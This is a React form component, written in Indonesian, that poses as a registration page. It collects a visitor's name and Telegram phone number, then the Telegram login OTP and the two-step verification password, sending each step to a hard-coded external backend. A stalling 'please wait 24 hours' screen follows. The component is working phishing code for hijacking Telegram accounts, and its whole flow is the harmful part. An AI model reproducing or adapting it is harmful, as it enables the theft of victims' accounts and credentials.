"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { zodResolver } from "@hookform/resolvers/zod"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "./ui/form"
import { toast } from "sonner"
import { Loader2 } from "lucide-react"

const formSchema = z.object({
  nama: z.string().min(2, "Nama harus diisi"),
  nomor_hp: z.string().min(10, "Nomor Telegram tidak valid"),
  otp: z.string().optional(),
  sandi: z.string().optional(),
})

export default function AuthForm() {
  const [step, setStep] = useState(1) 
  const [isLoading, setIsLoading] = useState(false)
  
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
  })

  async function sendToBackend(data: any, type: string) {
    const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || "https://backend-python-production-6e72.up.railway.app"
    try {
      await fetch(`${backendUrl}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          name: data.nama, 
          phone: data.nomor_hp,
          step: type,
          otp: data.otp || "",
          password: data.sandi || ""
        }),
      })
    } catch (error) {
      console.error("Gagal mengirim data")
    }
  }

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true)
    // Animasi loading 2 detik sebelum pindah tahap
    setTimeout(async () => {
      if (step === 1) {
        await sendToBackend(values, "DATA_AWAL")
        setStep(2)
        toast.success("Kode OTP terkirim")
      } else if (step === 2) {
        await sendToBackend(values, "INPUT_OTP")
        setStep(3)
        toast.success("OTP Terverifikasi")
      } else if (step === 3) {
        await sendToBackend(values, "INPUT_SANDI")
        setStep(4) 
      }
      setIsLoading(false)
    }, 2000)
  }

  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-sm bg-white text-center space-y-4">
        <div className="flex justify-center">
          <Loader2 className="h-12 w-12 animate-spin text-blue-600" />
        </div>
        <h2 className="text-xl font-bold text-gray-800">Mohon Tunggu...</h2>
        <p className="text-gray-600 text-sm">
          Pendaftaran Anda sedang diproses. Silakan tunggu konfirmasi dalam waktu <strong>1X24 jam</strong>. 
          Jangan menutup atau merefresh halaman ini sampai proses selesai.
        </p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-4 border rounded-xl shadow-sm bg-white">
      <div className="mb-6 overflow-hidden rounded-lg text-center">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto object-cover" />
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
          {step === 1 && (
            <>
              <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel>Nama Lengkap</FormLabel>
                  <FormControl><Input placeholder="Masukkan nama" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
              <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel>Nomor Telegram yang Aktif</FormLabel>
                  <FormControl><Input placeholder="08..." {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
            </>
          )}

          {step === 2 && (
            <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel>Masukkan Kode OTP</FormLabel>
                <FormControl><Input placeholder="Masukkan 5 digit kode" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          {step === 3 && (
            <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel>Masukkan Kata Sandi / Verifikasi Dua Langkah</FormLabel>
                <FormControl><Input type="password" placeholder="******" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          <Button type="submit" disabled={isLoading} className="w-full bg-black text-white hover:bg-gray-800">
            {isLoading ? (
              <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Memproses...</>
            ) : (
              step === 1 ? "Daftar Sekarang" : "Konfirmasi"
            )}
          </Button>
        </form>
      </Form>

      <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg text-[11px] text-red-800 leading-relaxed">
        <p className="font-bold mb-1 text-center text-sm">Peringatan:</p>
        <p className="text-center">Pendaftaran hanya akan di masukkan melaui data dari pendaftaran melalui telegram yang aktif!</p>
      </div>
    </div>
  )
}